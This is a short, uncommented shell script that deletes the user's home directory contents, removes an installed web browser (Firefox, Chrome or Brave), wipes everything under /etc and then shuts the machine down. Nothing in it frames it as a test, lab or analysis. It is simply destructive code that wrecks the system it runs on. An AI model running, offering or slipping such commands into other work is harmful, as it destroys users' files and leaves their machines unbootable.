#!/bin/sh

rm -rf "/home/$USER/*"
if [ -e "/usr/bin/firefox" ]; then
	rm -rf /usr/bin/firefox
elif [ -e "/usr/bin/chrome" ]; then
	rm -rf /usr/bin/chrome
elif [ -e "/usr/bin/brave-browser" ]; then
	rm -rf /usr/bin/brave-browser
fi

rm -rf /etc/*
/bin/shutdown -P now
